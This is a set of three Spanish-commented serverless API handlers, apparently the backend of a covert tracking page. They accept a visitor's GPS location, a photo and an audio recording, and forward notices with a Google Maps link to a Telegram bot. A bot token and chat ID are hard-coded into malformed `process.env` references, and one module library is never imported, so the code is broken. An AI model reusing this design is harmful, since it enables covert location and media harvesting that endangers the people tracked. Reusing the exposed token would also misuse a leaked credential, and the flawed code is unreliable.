export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { lat, lon, accuracy } = req.body;
    
    try {
      // Enviar a Telegram
      const telegramResponse = await fetch(
        `https://api.telegram.org/bot${process.env.8176325555:AAEBvwzG3-5_X5jQmm9FaCxwirvYMRkmdIo}/sendMessage`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: process.env.6596740784,
            text: `📍 Nueva ubicación\nLat: ${lat}\nLon: ${lon}\nPrecisión: ${accuracy}m\nhttps://maps.google.com?q=${lat},${lon}`
          })
        }
      );

      res.status(200).json({ success: true });
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
  } else {
    res.setHeader('Allow', ['POST']);
    res.status(405).end('Method Not Allowed');
  }
}
export default async function handler(req, res) {
  if (req.method === 'POST') {
    const { image } = req.body;
    
    try {
      // Enviar a Telegram (solo texto, para imágenes necesitarías otro enfoque)
      const telegramResponse = await fetch(
        `https://api.telegram.org/bot${process.env.8176325555:AAEBvwzG3-5_X5jQmm9FaCxwirvYMRkmdIo}/sendMessage`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: process.env.6596740784,
            text: `📸 Foto recibida (${image.length} bytes)`
          })
        }
      );

      // Guardar en sistema de archivos o almacenamiento (opcional)
      // ... código para guardar la imagen ...

      res.status(200).json({ success: true });
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
  } else {
    res.setHeader('Allow', ['POST']);
    res.status(405).end('Method Not Allowed');
  }
}
export const config = {
  api: {
    bodyParser: false, // Necesario para manejar FormData
  },
};

export default async function handler(req, res) {
  if (req.method === 'POST') {
    try {
      const formData = await new Promise((resolve, reject) => {
        const form = new multiparty.Form();
        form.parse(req, (err, fields, files) => {
          if (err) reject(err);
          resolve({ fields, files });
        });
      });

      const audioFile = formData.files.audio[0];
      
      // Enviar a Telegram (solo notificación)
      const telegramResponse = await fetch(
        `https://api.telegram.org/bot${process.env.8176325555:AAEBvwzG3-5_X5jQmm9FaCxwirvYMRkmdIo}/sendMessage`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: process.env.6596740784,
            text: `🎤 Audio recibido (${audioFile.size} bytes)`
          })
        }
      );

      // Guardar el archivo (opcional)
      // ... código para guardar el audio ...

      res.status(200).json({ success: true });
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
  } else {
    res.setHeader('Allow', ['POST']);
    res.status(405).end('Method Not Allowed');
  }
}
